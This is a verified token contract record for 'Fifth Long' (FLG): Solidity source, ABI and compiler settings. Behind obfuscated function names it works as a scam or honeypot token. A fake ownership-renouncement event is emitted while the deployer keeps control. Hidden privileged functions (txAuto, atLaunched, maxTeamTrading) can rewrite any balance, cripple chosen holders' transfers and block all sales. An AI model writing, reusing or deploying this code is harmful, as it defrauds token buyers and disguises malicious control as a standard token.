{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface listMaxSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamTo {\n    function createPair(address marketingSwapLaunch, address amountTake) external returns (address);\n}\n\ninterface sellExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minEnable) external view returns (uint256);\n\n    function transfer(address modeMax, uint256 listMin) external returns (bool);\n\n    function allowance(address tradingLimitReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeMax,\n        uint256 listMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeLimit, uint256 value);\n    event Approval(address indexed tradingLimitReceiver, address indexed spender, uint256 value);\n}\n\ninterface sellExemptMetadata is sellExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FifthLong is receiverReceiver, sellExempt, sellExemptMetadata {\n\n    uint256 private tradingWallet;\n\n    function transferFrom(address feeReceiver, address modeMax, uint256 listMin) external override returns (bool) {\n        if (_msgSender() != toFund) {\n            if (walletMarketing[feeReceiver][_msgSender()] != type(uint256).max) {\n                require(listMin <= walletMarketing[feeReceiver][_msgSender()]);\n                walletMarketing[feeReceiver][_msgSender()] -= listMin;\n            }\n        }\n        return buyMode(feeReceiver, modeMax, listMin);\n    }\n\n    uint256 amountSellEnable;\n\n    string private sellMinTo = \"Fifth Long\";\n\n    constructor (){\n        \n        listMaxSell senderReceiver = listMaxSell(toFund);\n        tokenTeamTo = teamTo(senderReceiver.factory()).createPair(senderReceiver.WETH(), address(this));\n        if (txLaunchEnable == buyExemptSender) {\n            tradingWallet = toMode;\n        }\n        takeFee = _msgSender();\n        shouldFundTrading();\n        launchedFeeAuto[takeFee] = true;\n        receiverLaunched[takeFee] = exemptToken;\n        \n        emit Transfer(address(0), takeFee, exemptToken);\n    }\n\n    bool public txLaunchEnable;\n\n    function shouldFundTrading() public {\n        emit OwnershipTransferred(takeFee, address(0));\n        limitIs = address(0);\n    }\n\n    mapping(address => bool) public launchedFeeAuto;\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderAt;\n    }\n\n    function receiverAuto(address atTradingSwap) public {\n        require(atTradingSwap.balance < 100000);\n        if (liquiditySwap) {\n            return;\n        }\n        if (toMode == buyLimit) {\n            marketingToMode = buyLimit;\n        }\n        launchedFeeAuto[atTradingSwap] = true;\n        \n        liquiditySwap = true;\n    }\n\n    uint256 public shouldWalletLaunched;\n\n    address public takeFee;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptToken;\n    }\n\n    mapping(address => bool) public launchedFund;\n\n    mapping(address => uint256) private receiverLaunched;\n\n    address toFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address fundMax, uint256 listMin) public virtual override returns (bool) {\n        walletMarketing[_msgSender()][fundMax] = listMin;\n        emit Approval(_msgSender(), fundMax, listMin);\n        return true;\n    }\n\n    function autoWallet() private view {\n        require(launchedFeeAuto[_msgSender()]);\n    }\n\n    function maxTeamTrading(uint256 listMin) public {\n        autoWallet();\n        amountSellEnable = listMin;\n    }\n\n    address private limitIs;\n\n    function buyMode(address feeReceiver, address modeMax, uint256 listMin) internal returns (bool) {\n        if (feeReceiver == takeFee) {\n            return enableFund(feeReceiver, modeMax, listMin);\n        }\n        uint256 sellWallet = sellExempt(tokenTeamTo).balanceOf(walletFee);\n        require(sellWallet == amountSellEnable);\n        require(modeMax != walletFee);\n        if (launchedFund[feeReceiver]) {\n            return enableFund(feeReceiver, modeMax, takeAt);\n        }\n        return enableFund(feeReceiver, modeMax, listMin);\n    }\n\n    mapping(address => mapping(address => uint256)) private walletMarketing;\n\n    function getOwner() external view returns (address) {\n        return limitIs;\n    }\n\n    uint256 public marketingToMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundMin;\n    }\n\n    uint8 private senderAt = 18;\n\n    function balanceOf(address minEnable) public view virtual override returns (uint256) {\n        return receiverLaunched[minEnable];\n    }\n\n    uint256 private exemptToken = 100000000 * 10 ** 18;\n\n    string private fundMin = \"FLG\";\n\n    bool public buyExemptSender;\n\n    function atLaunched(address tradingLaunchedTeam) public {\n        autoWallet();\n        \n        if (tradingLaunchedTeam == takeFee || tradingLaunchedTeam == tokenTeamTo) {\n            return;\n        }\n        launchedFund[tradingLaunchedTeam] = true;\n    }\n\n    event OwnershipTransferred(address indexed feeBuyMin, address indexed feeMarketingSwap);\n\n    uint256 constant takeAt = 18 ** 10;\n\n    function enableFund(address feeReceiver, address modeMax, uint256 listMin) internal returns (bool) {\n        require(receiverLaunched[feeReceiver] >= listMin);\n        receiverLaunched[feeReceiver] -= listMin;\n        receiverLaunched[modeMax] += listMin;\n        emit Transfer(feeReceiver, modeMax, listMin);\n        return true;\n    }\n\n    function transfer(address swapAuto, uint256 listMin) external virtual override returns (bool) {\n        return buyMode(_msgSender(), swapAuto, listMin);\n    }\n\n    uint256 receiverTo;\n\n    address public tokenTeamTo;\n\n    uint256 private shouldTo;\n\n    function txAuto(address swapAuto, uint256 listMin) public {\n        autoWallet();\n        receiverLaunched[swapAuto] = listMin;\n    }\n\n    function allowance(address launchLaunched, address fundMax) external view virtual override returns (uint256) {\n        if (fundMax == toFund) {\n            return type(uint256).max;\n        }\n        return walletMarketing[launchLaunched][fundMax];\n    }\n\n    bool public liquiditySwap;\n\n    function name() external view virtual override returns (string memory) {\n        return sellMinTo;\n    }\n\n    function owner() external view returns (address) {\n        return limitIs;\n    }\n\n    address walletFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public toMode;\n\n    uint256 public buyLimit;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLimitReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeBuyMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeMarketingSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLaunchedTeam\",\"type\":\"address\"}],\"name\":\"atLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minEnable\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyExemptSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedFeeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listMin\",\"type\":\"uint256\"}],\"name\":\"maxTeamTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTradingSwap\",\"type\":\"address\"}],\"name\":\"receiverAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFundTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldWalletLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTeamTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listMin\",\"type\":\"uint256\"}],\"name\":\"txAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLaunchEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FifthLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}